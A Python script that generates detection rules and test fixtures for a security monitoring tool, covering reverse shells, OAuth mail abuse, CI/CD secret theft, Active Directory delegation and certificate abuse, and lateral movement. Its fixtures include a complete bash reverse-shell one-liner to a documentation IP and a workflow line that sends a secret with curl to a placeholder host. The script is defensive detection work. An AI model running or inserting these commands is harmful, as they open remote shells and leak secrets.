"""Reproducible advanced rule package and contract fixtures; no analyzed content is executed."""
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2] / 'src-tauri' / 'resources'
rules, fixtures = [], []

def add(id, name, attack, steps, by, events, *, level=4, window='15m', claim='activity', unless='', benign='Automação administrativa autorizada; conferir autorização e contexto.'):
    rule = dict(id=id, name=name, description=name, severity='high', attack=attack,
                kind='sequence' if len(steps)>1 else 'single', by=by,
                evidence=dict(level=level, claim=claim, rationale=name + ': condições específicas e vínculos registrados nos eventos.',
                    required=[], missing=['A autorização da atividade não é determinada pelo log.'], benign=[benign], maturity='experimental', version='2'),
                references=['https://attack.mitre.org/techniques/'+t.replace('.', '/')+'/' for t in attack])
    if len(steps)>1:
        rule.update(window=window,steps=[s if isinstance(s,dict) else {'where':s} for s in steps])
    else: rule['where']=steps[0]
    if unless: rule['unless']=unless
    rules.append(rule)
    fixtures.append(dict(rule=id, events=events, level=level))

def e(action, **fields):
    return {'event.category':'security','event.action':action,'event.outcome':'success',
            'organization.id':'tenant-a','host.name':'server-a',**fields}

shell='bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'
add('attempt.reverse-shell.request','Payload completo de shell reverso em parâmetro de comando da requisição',['T1190','T1059.004'],
    ['_sec.action:http_request _sec.reverse_shell_request:true'],[],
    [e('http_request', **{'http.request.method':'POST','http.request.body.command':shell,'event.outcome':'blocked'})],level=5,claim='attempt')
add('attempt.reverse-shell.process','Comando completo de shell reverso registrado para execução',['T1059.004','T1071'],
    ['_sec.action:(process_start OR script_execution) _sec.reverse_shell:true'],[],
    [e('process_start', **{'process.command_line':shell,'event.outcome':'unknown'})],level=5,claim='attempt')

app={'application.id':'app-1','oauth.grant.id':'grant-1'}
add('chain.oauth.grant-mail','Consentimento OAuth usado para encaminhar e ocultar mensagens',['T1098.003','T1114.003'],[
    '_sec.action:oauth_consent _sec.outcome:success oauth.scope:/(Mail.ReadWrite|Mail.ReadWrite.All|full_access_as_app)/',
    '_sec.action:mail_rule_create _sec.outcome:success mail.forward.external:true mail.rule.hide:true'],['_sec.application','_sec.grant'],[
    e('oauth_consent',**app,**{'oauth.scope':'Mail.ReadWrite'}),e('mail_rule_create',**app,**{'mail.forward.external':True,'mail.rule.hide':True})],window='24h')
add('chain.oauth.token-exfil','Token OAuth usado para ler e transferir o mesmo objeto sensível',['T1528','T1537'],[
    '_sec.action:object_read _sec.outcome:success data.classification:sensitive',
    '_sec.action:object_transfer _sec.outcome:success network.direction:outbound destination.external:true'],['_sec.application','_sec.token','_sec.resource'],[
    e('object_read',**{'application.id':'a','token.id':'t','resource.id':'object-1','data.classification':'sensitive'}),
    e('object_transfer',**{'application.id':'a','token.id':'t','resource.id':'object-1','network.direction':'outbound','destination.external':True})])

pipeline={'repository.id':'repo-1','pipeline.run.id':'run-1','git.commit.id':'sha-1'}
add('chain.cicd.secret-transfer','Alteração de workflow usada em execução que lê e envia o mesmo segredo',['T1195.002','T1552.001','T1048'],[
    {'where':r'_sec.action:workflow_change _sec.outcome:success workflow.diff:/secrets\.[A-Z_]+/ workflow.diff:/(curl|wget|Invoke-WebRequest)/','by':['_sec.repository','_sec.revision','_sec.secret']},
    '_sec.action:secret_access _sec.outcome:success _sec.run:*',
    '_sec.action:secret_transfer _sec.outcome:success _sec.run:* destination.external:true network.direction:outbound'],
    ['_sec.repository','_sec.revision','_sec.secret'],[
    e('workflow_change',**pipeline,**{'secret.id':'deploy','workflow.diff':'curl --data ${{ secrets.DEPLOY_TOKEN }} https://collector.invalid'}),
    e('secret_access',**pipeline,**{'secret.id':'deploy'}),
    e('secret_transfer',**pipeline,**{'secret.id':'deploy','destination.external':True,'network.direction':'outbound'})])
add('chain.cicd.publish-token','Token de publicação alterando proteção e publicando artefato divergente',['T1552.001','T1195.002'],[
    '_sec.action:repository_protection_disable _sec.outcome:success',
    '_sec.action:package_publish _sec.outcome:success artifact.attestation.mismatch:true'],['_sec.repository','_sec.token'],[
    e('repository_protection_disable',**{'repository.id':'r','token.id':'t'}),e('package_publish',**{'repository.id':'r','token.id':'t','artifact.attestation.mismatch':True})])

add('chain.ad.rbcd-use','Delegação RBCD adicionada e utilizada pelo principal beneficiado',['T1098','T1550.003'],[
    {'where':'_sec.action:directory_change _sec.outcome:success AttributeLDAPDisplayName:msDS-AllowedToActOnBehalfOfOtherIdentity delegation.operation:add','by':['_sec.beneficiary','_sec.resource_spn']},
    {'where':'_sec.action:service_ticket _sec.outcome:success kerberos.delegated:true','by':['_sec.delegator','_sec.resource_spn']}],
    ['_sec.beneficiary','_sec.resource_spn'],[
    e('directory_change',**{'AttributeLDAPDisplayName':'msDS-AllowedToActOnBehalfOfOtherIdentity','delegation.operation':'add','delegation.beneficiary.sid':'S-1-5-21-100','delegation.resource_spn':'cifs/target'}),
    e('service_ticket',**{'kerberos.delegated':True,'delegation.delegator.sid':'S-1-5-21-100','delegation.resource_spn':'cifs/target'})],window='24h')
cert={'certificate.thumbprint':'ABCDEF0123','certificate.issuer':'CA-a'}
add('chain.ad.certificate-auth','Certificado com identidade divergente seguido de autenticação com o mesmo certificado',['T1649','T1550'],[
    '_sec.action:certificate_issue _sec.outcome:success _sec.certificate_identity_mismatch:true',
    '_sec.action:auth_success _sec.outcome:success authentication.method:certificate'],['_sec.certificate'],[
    e('certificate_issue',**cert,**{'certificate.subject.upn':'admin@domain','certificate.requester.upn':'user@domain'}),
    e('auth_success',**cert,**{'authentication.method':'certificate'})],window='24h',unless='certificate.enrollment_agent_authorized:true')
add('chain.ad.shadow-key-auth','Chave de autenticação adicionada ao diretório e utilizada pelo mesmo alvo',['T1098','T1550'],[
    '_sec.action:directory_change _sec.outcome:success AttributeLDAPDisplayName:msDS-KeyCredentialLink key.operation:add',
    '_sec.action:auth_success _sec.outcome:success authentication.method:keytrust'],['key.id','target.id'],[
    e('directory_change',**{'AttributeLDAPDisplayName':'msDS-KeyCredentialLink','key.operation':'add','key.id':'key-1','target.id':'user-1'}),
    e('auth_success',**{'authentication.method':'keytrust','key.id':'key-1','target.id':'user-1'})],window='24h')

lateral={'logon.id':'0x123','source.ip':'192.0.2.30','user.id':'SID-user','artifact.sha256':'abc123'}
add('chain.lateral.windows','Logon remoto, transferência e execução suspeita vinculados ao mesmo logon e artefato',['T1021.002','T1569.002'],[
    {'where':'_sec.action:(auth_success OR logon) _sec.outcome:success LogonType:(3 OR 10) _sec.source_address:*','by':['_sec.logon','_sec.principal']},
    r'_sec.action:file_create _sec.outcome:success share.name:/(ADMIN\$|C\$)/ _sec.artifact:*',
    '_sec.action:process_start _sec.outcome:success _sec.reverse_shell:true _sec.artifact:*'],['_sec.logon','_sec.principal'],[
    e('auth_success',**lateral,**{'LogonType':'3'}),e('file_create',**lateral,**{'share.name':'ADMIN$'}),
    e('process_start',**lateral,**{'process.command_line':shell})],level=5,claim='execution')
add('chain.lateral.ssh','Sessão SSH seguida de transferência e execução do artefato com comportamento de abuso',['T1021.004','T1105'],[
    '_sec.action:(auth_success OR logon) _sec.outcome:success service.name:sshd',
    '_sec.action:file_create _sec.outcome:success _sec.artifact:*',
    '_sec.action:process_start _sec.outcome:success _sec.reverse_shell:true _sec.artifact:*'],['_sec.remote_session','_sec.principal'],[
    e('auth_success',**{'ssh.session.id':'ssh-1','user.id':'u','service.name':'sshd'}),
    e('file_create',**{'ssh.session.id':'ssh-1','user.id':'u','artifact.sha256':'abc'}),
    e('process_start',**{'ssh.session.id':'ssh-1','user.id':'u','artifact.sha256':'abc','process.command_line':shell})],level=5,claim='execution')

for rule in rules:
    # Cross-stage bindings beyond the principal grouping key must also match.
    if rule['id'] in ('chain.lateral.windows','chain.lateral.ssh'):
        rule['bindings']=[{'field':'_sec.artifact','steps':[1,2]}]
    if rule['id']=='chain.cicd.secret-transfer':
        rule['bindings']=[{'field':'_sec.run','steps':[1,2]}]

(ROOT/'detection-advanced.json').write_text(json.dumps({'version':3,'rules':rules},ensure_ascii=False,indent=2)+'\n',encoding='utf-8')
(ROOT/'detection-advanced-validation.json').write_text(json.dumps({'fixtures':fixtures},ensure_ascii=False,indent=2)+'\n',encoding='utf-8')
